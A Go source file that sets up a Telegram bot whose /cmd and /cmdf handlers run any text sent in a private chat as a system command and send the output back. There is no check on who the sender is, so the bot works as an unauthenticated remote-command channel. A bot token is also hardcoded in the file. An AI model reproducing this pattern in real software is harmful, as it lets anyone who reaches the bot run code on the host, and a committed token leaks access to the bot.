package handler

import (
	"fmt"
	tb "gopkg.in/tucnak/telebot.v2"
	"io/ioutil"
	"os/exec"
	"time"
)

func eerr(e error) {
	if e != nil {
		fmt.Println(e)
	}
}
func initBot() {

	bot, _ := tb.NewBot(tb.Settings{
		// You can also set custom API URL.
		// If field is empty it equals to "https://api.telegram.org".
		//URL: "http://195.129.111.17:8012",

		Token:  "1495194079:AAHQmVx0CJZe_ZDRseHHD3ErNISQhl9ahbk",
		Poller: &tb.LongPoller{Timeout: 10 * time.Second},
	})
	streamChat(bot)
	bot.Start()

}

func streamChat(bot *tb.Bot) {

	//stream cmd command /cmd <command>
	bot.Handle("/cmd", func(m *tb.Message) {
		if !m.Private() {
			return
		}

		fmt.Println("Cmd From Telegram " + m.Payload)
		result, err := exec.Command(m.Payload).Output()
		eerr(err)
		fmt.Println(string(result))
		//controller.CmdExec(m.Payload)
		//a := &tb.Document{File:tb.FromDisk("/tmp/log.txt"),MIME: ".txt"}
		//fmt.Println(a.OnDisk()) // true
		//fmt.Println(a.InCloud()) // false
		//_,e := bot.Send(m.Sender,a)
		//eerr(e)
		bot.Send(m.Sender, string(result))
	})

	//stream cmd command /cmd <command> save to file
	bot.Handle("/cmdf", func(m *tb.Message) {
		if !m.Private() {
			return
		}

		fmt.Println("Cmd From Telegram " + m.Payload)
		result, err := exec.Command(m.Payload).Output()
		eerr(err)
		d1 := result
		err = ioutil.WriteFile("/tmp/log.txt", d1, 0644)
		eerr(err)
		a := &tb.Document{File: tb.FromDisk("/tmp/log.txt"), MIME: ".txt", FileName: "cmd_exec_" + m.Payload + "_at_" + time.Now().String() + ".txt"}
		fmt.Println(a.OnDisk())  // true
		fmt.Println(a.InCloud()) // false
		bot.Send(m.Sender, a)
	})

}

func Begin() {
	fmt.Println("Bot Is Starting...")
	initBot()
}
